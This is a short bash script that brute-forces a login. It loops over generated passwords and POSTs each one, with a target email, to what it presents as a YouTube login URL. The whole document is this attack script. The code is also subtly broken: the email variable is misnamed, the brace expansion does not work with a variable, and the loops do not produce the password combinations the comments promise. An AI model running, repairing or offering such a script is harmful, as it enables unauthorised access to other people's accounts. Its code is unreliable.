bash

#set target email
targetemail="example@example.com"

#set character set
charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+=-"

#loop through all possible combination of 8-16 characters
for i in {8..16}
do
    for j in $(echo {1..$i} | tr -d ' ')
    do
        for k in $(echo $charset | fold -w$j)
        do
            curl -X POST -d "email=$target_email&password=$k" https://www.youtube.com/channel/login
        done
    done
done
